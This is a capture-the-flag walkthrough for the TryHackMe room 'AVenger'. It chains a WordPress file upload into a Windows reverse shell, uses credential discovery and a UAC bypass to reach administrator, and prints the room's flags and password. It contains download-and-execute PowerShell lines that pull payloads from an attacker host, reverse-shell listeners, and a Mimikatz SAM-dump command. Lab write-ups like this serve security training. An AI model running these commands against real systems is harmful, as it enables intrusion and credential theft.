# AVenger

**Room:** AVenger  
**Platform:** TryHackMe  
**Difficulty:** Medium
**Focus:** Web enumeration, WordPress enumeration, malicious file handling, PowerShell, reverse shells, Windows privilege escalation, UAC bypass, and credential discovery.

> **Lab note:** All commands and exploitation steps below are intended for the isolated TryHackMe machine.

---

## Overview

The **Avenger** room combines web application enumeration with Windows post-exploitation.

The attack chain is roughly:

```text
Web enumeration
      ↓
WordPress / Forminator discovery
      ↓
Malicious .bat attachment
      ↓
PowerShell reverse shell
      ↓
Windows user access
      ↓
Credential discovery
      ↓
Local Administrator
      ↓
UAC bypass
      ↓
Administrator shell
      ↓
Root flag
```

The interesting part of this machine is that initial access doesn't come from a conventional WordPress exploit. Instead, the application simulates a user opening an uploaded attachment, allowing us to turn the file-upload functionality into code execution.

---

# 1. Enumeration

I started with an Nmap scan to identify the services exposed by the target:

```bash
sudo nmap -sC -sV -O <TARGET_IP>
```

The scan showed a Windows machine running a web server.

The web server was running:

```text
Apache/2.4.56 (Win64)
PHP/8.0.28
```

The hostname **gift** also appeared during enumeration.

### Web enumeration

I then used several standard web-enumeration tools:

```bash
dirb http://<TARGET_IP>/ /usr/share/wordlists/dirb/common.txt
```

```bash
gobuster dir -u http://<TARGET_IP>/ \
-w /usr/share/wordlists/dirb/common.txt
```

I also used:

```bash
ffuf -w /usr/share/wordlists/wfuzz/general/big.txt \
-u http://<TARGET_IP>/FUZZ -fw 1
```

and:

```bash
nikto -h <TARGET_IP>
```

Among the information discovered was a WordPress installation.

The application was running **WordPress 6.2.2**, so I moved on to WordPress-specific enumeration.

---

# 2. WordPress Enumeration

I used WPScan to enumerate installed plugins:

```bash
wpscan --url http://avenger.tryhackme/gift/ --enumerate p
```

One particularly interesting component was the **Forminator** plugin.

The site also contained information about several employees, including:

- Mike Rich
    
- Jenny Smith
    
- George Doe
    
- Maria Jay
    

During enumeration, I also discovered a useful hostname:

```text
avenger.tryhackme
```

I added it to `/etc/hosts`:

```text
<TARGET_IP> avenger.tryhackme
```

For example:

```bash
sudo nano /etc/hosts
```

Then:

```text
10.10.x.x avenger.tryhackme
```

This allowed the site to be accessed properly through:

```text
http://avenger.tryhackme/gift/
```

---

# 3. Initial Access — Forminator File Upload

The important discovery was a Forminator form on the page.

The form allowed a user to attach a file.

More importantly, the challenge simulates another user interacting with uploaded attachments.

That changes the attack surface considerably.

Instead of needing the server itself to execute an uploaded file immediately, we can attempt to upload something that executes when the simulated user opens it.

---

## Creating the malicious batch file

I created:

```text
Avenger.bat
```

containing:

```bat
START /B powershell -c $code=(New-Object System.Net.Webclient).DownloadString('http://<ATTACKER_IP>:8000/Avenger.txt');iex 'powershell -E $code'
```

The purpose of this file is straightforward:

1. Start PowerShell.
    
2. Download `Avenger.txt` from our machine.
    
3. Interpret the downloaded content as PowerShell code.
    

---

# 4. Preparing the PowerShell Payload

I then generated the PowerShell payload that would establish a reverse connection.

The payload used Powercat to connect back to my machine.

For example:

```bash
LHOST=<ATTACKER_IP>
LPORT=9999
```

The resulting payload was stored as:

```text
Avenger.txt
```

The important distinction is:

```text
Avenger.bat
     ↓
downloads
     ↓
Avenger.txt
     ↓
PowerShell payload
     ↓
reverse connection
```

---

# 5. Hosting the Payload

I started a simple HTTP server from the directory containing `Avenger.txt`:

```bash
python3 -m http.server 8000
```

I then opened another terminal and started a listener:

```bash
nc -lvnp 9999
```

Finally, I uploaded:

```text
Avenger.bat
```

through the Forminator attachment functionality.

After the simulated user interacted with the attachment, the reverse connection arrived.

At this point, I had command execution in the context of the Windows user that opened the file.

---

# 6. Finding the User Flag

Once the shell was established, I began enumerating the machine.

One of the important discoveries was the user's home directory and the presence of the user flag.

The room's user flag is:

```text
THM{WITH_GREAT_POWER_COMES_GREAT_RESPONSIBILITY}
```

So the initial compromise was successful.

---

# 7. Credential Discovery

The next objective was privilege escalation.

I hosted **PowerUp.ps1** on my machine and downloaded it to the target.

For example:

```powershell
Invoke-Expression (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>:8000/PowerUp.ps1')
```

Then I ran:

```powershell
Invoke-AllChecks | Format-List
```

`Format-List` is useful here because the reverse shell doesn't always display PowerUp's output cleanly.

PowerUp revealed useful information about the compromised Windows environment, including credentials associated with the user.

The discovered account was:

```text
hugo
```

and the room's walkthrough identified the password as:

```text
SurpriseMF123!
```

---

# 8. RDP Access

With valid credentials available, I could access the Windows machine through RDP.

From Kali:

```bash
xfreerdp /v:<TARGET_IP> /u:hugo /p:'SurpriseMF123!' /dynamic-resolution
```

This provided a much more capable Windows session than the original reverse shell.

The important discovery was that **Hugo was a local administrator**.

However, being a member of the local Administrators group does not automatically mean that every process is running with an elevated Administrator token.

That's where **UAC** becomes relevant.

---

# 9. UAC and the Administrator Token

The situation was effectively:

```text
Hugo
 │
 ├── Local Administrator
 │
 └── Current shell is NOT elevated
```

So although the account possessed administrative privileges, the current process did not necessarily have the elevated token required for privileged operations.

The challenge therefore introduces a UAC-bypass stage.

---

# 10. Invoke-Bypass

The walkthrough uses **Invoke-Bypass**, a PowerShell-based UAC bypass technique.

The original script was created by OvergrownCarrot1. The walkthrough used a modified version called:

```text
Invoke-BypassII.ps1
```

The modified version allowed separate configuration of:

- attacker IP
    
- listener port
    
- HTTP server port
    

I placed the script and `nc64.exe` in the same directory being served by Python's HTTP server.

For example:

```bash
python3 -m http.server 8000
```

I also prepared a listener:

```bash
nc -lvnp 1945
```

From the existing PowerShell session:

```powershell
Invoke-Expression (Invoke-WebRequest -UseBasicParsing http://<ATTACKER_IP>:8000/Invoke-BypassII.ps1)
```

Then:

```powershell
Invoke-BypassII -LHOST <ATTACKER_IP> -LPORT 1945 -WWWPORT 8000
```

The technique establishes another shell with elevated privileges.

---

# 11. Confirming Administrative Access

Once the elevated shell was received, I could verify the account and privileges.

At this point, the machine was effectively compromised at the Administrator level.

The flags could then be located with:

```powershell
Get-ChildItem C:\Users -Recurse | Select-String "THM{"
```

This revealed:

```text
C:\Users\hugo\Desktop\user.txt
C:\Users\Administrator\Desktop\root.txt
```

The flags were:

### User flag

```text
THM{WITH_GREAT_POWER_COMES_GREAT_RESPONSIBILITY}
```

### Root flag

```text
THM{I_CAN_DO_THIS_ALL_DAY}
```

---

# 12. Post-Exploitation

With administrative access established, further credential extraction was possible.

The original walkthrough used Mimikatz through PowerShell to inspect local authentication material.

For example, after obtaining an appropriately privileged session, it used:

```powershell
Invoke-Mimi -Command '"token::elevate" "privilege::debug" "lsadump::sam"'
```

The resulting output contained NTLM hashes for local accounts.

The important lesson here is that obtaining **local Administrator execution** dramatically expands what can be accessed on a Windows machine.

---

# Attack Chain Summary

The entire room can be reduced to:

```text
                    ┌──────────────────┐
                    │   Nmap / Web     │
                    │   Enumeration    │
                    └────────┬─────────┘
                             │
                             ▼
                    ┌──────────────────┐
                    │ WordPress 6.2.2  │
                    │ + Forminator     │
                    └────────┬─────────┘
                             │
                             ▼
                    ┌──────────────────┐
                    │ File Attachment  │
                    │     .bat         │
                    └────────┬─────────┘
                             │
                             ▼
                    ┌──────────────────┐
                    │ PowerShell       │
                    │ Reverse Shell    │
                    └────────┬─────────┘
                             │
                             ▼
                    ┌──────────────────┐
                    │ Initial User     │
                    │     Access       │
                    └────────┬─────────┘
                             │
                             ▼
                    ┌──────────────────┐
                    │ PowerUp /        │
                    │ Credential       │
                    │ Discovery        │
                    └────────┬─────────┘
                             │
                             ▼
                    ┌──────────────────┐
                    │ Hugo             │
                    │ Local Admin      │
                    └────────┬─────────┘
                             │
                             ▼
                    ┌──────────────────┐
                    │ UAC Bypass       │
                    │ Invoke-Bypass    │
                    └────────┬─────────┘
                             │
                             ▼
                    ┌──────────────────┐
                    │ Elevated         │
                    │ Administrator    │
                    └────────┬─────────┘
                             │
                             ▼
                    ┌──────────────────┐
                    │     ROOT FLAG    │
                    └──────────────────┘
```

---

# Key Lessons

### 1. Don't stop at the main webpage

The initial page didn't immediately expose an obvious exploit. Enumeration of WordPress and its plugins revealed the more interesting attack surface.

### 2. File uploads deserve careful attention

A file upload isn't necessarily dangerous because the server executes the uploaded file. It can also become dangerous when another application component or user automatically interacts with the uploaded content.

### 3. Windows privilege escalation isn't simply "get Administrator"

Windows distinguishes between **group membership** and the privileges contained in the current access token. That's why UAC can still matter even when a compromised account belongs to the local Administrators group.

### 4. PowerShell is extremely powerful

The room demonstrates how PowerShell can be used throughout an attack chain:

```text
Payload delivery
      ↓
Command execution
      ↓
Enumeration
      ↓
Credential discovery
      ↓
Privilege escalation
```

### 5. Web exploitation and Windows exploitation can form one chain

The most valuable lesson from Avenger is the transition between different attack surfaces:

```text
Web application
      ↓
Initial access
      ↓
Windows enumeration
      ↓
Credential discovery
      ↓
Privilege escalation
```

Rather than treating web exploitation and Windows privilege escalation as completely separate skills, this room demonstrates how they can connect into one continuous attack path.

---

## Flags

|Objective|Flag|
|---|---|
|User|`THM{WITH_GREAT_POWER_COMES_GREAT_RESPONSIBILITY}`|
|Root|`THM{I_CAN_DO_THIS_ALL_DAY}`|

**Bottom line:** Avenger is primarily a lesson in **chaining vulnerabilities**. The individual techniques—WordPress enumeration, malicious attachment handling, PowerShell, reverse shells, credential discovery, and UAC bypass—become much more interesting when connected into a single attack path.